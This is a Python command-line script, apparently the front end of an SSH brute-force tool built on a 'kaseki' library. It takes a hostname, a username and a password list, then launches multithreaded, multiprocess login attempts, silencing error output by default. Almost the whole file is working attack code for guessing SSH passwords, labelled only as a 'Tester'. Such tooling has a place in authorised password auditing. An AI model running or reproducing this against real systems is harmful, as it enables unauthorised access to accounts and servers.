import argparse
import sys
from termcolor import cprint
from kaseki import SSHBruteForceManager, SSHTarget


def main():

    # This error file will redirect error stream/output to the file if debug not set
    # This was made due to paramiko ssh connect making uncatchable EOF & Banner Error exceptions
    error_file = open('/dev/null', 'w')

    # Get command line arguments
    parser = argparse.ArgumentParser(description="SSH Brute Force Tester")
    parser.add_argument("hostname", default="localhost", help="Hostname or IP of the SSH server")
    parser.add_argument("--username", "-u", required=True, help="Username for SSH login")
    parser.add_argument("--passlist", "-P", required=True, help="File containing list of passwords")
    parser.add_argument("--threads", "-t", type=int, default=10, help="Amount of threads per process")
    parser.add_argument("--processes", "--procs", type=int, default=0, help="Amount of processes")
    parser.add_argument("--port", "-p", type=int, default=22, help="SSH port (default is 22)")
    parser.add_argument("--debug", "-d", action="store_true", help="Enable error outputs")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")

    args = parser.parse_args()

    # Relay the stderr stream to error_file if not in debug mode (default)
    sys.stderr = sys.stderr if args.debug else error_file

    # Amount of multiprocessed bruteforce to run
    process_n = args.processes or 0

    # Amount of thread per bruteforcer regardless if multiprocessed or not
    thread_n = args.threads or 0

    hostname = args.hostname
    port = args.port
    username = args.username

    # Path to the password file containing one password per line
    passlist = args.passlist

    # If verbose
    verbose = args.verbose

    cprint(f"[*] Starting SSH Bruteforce Session", "blue", attrs=["bold"])
    cprint(f"[*] Target: {username}@{hostname}:{port}", "blue")
    cprint(f"[*] Processes: {process_n}", "blue") if process_n else None
    cprint(f"[*] {'Threads each process' if process_n > 0 else 'Threads'}: {thread_n}", "blue")
    cprint(f"[*] Total threads: {thread_n * process_n if process_n > 0 else thread_n}", "blue") if process_n > 0 else None
    print("")

    # Create SSH target object
    target = SSHTarget(
        hostname=hostname, 
        port=port, 
        username=username
    )

    # This will manage our bruteforcers, password producer, and result consumer
    brute_forcer = SSHBruteForceManager(
        target, 
        passlist
    )

    # Initialize/starts our producers and consumers and then the bruteforcers
    brute_forcer.start(
        process_n=process_n,
        login_thread_n_each=thread_n,
    )
    cprint("[*] Finished", "blue", attrs=["bold"]) if verbose else None

if __name__ == "__main__":
    main()
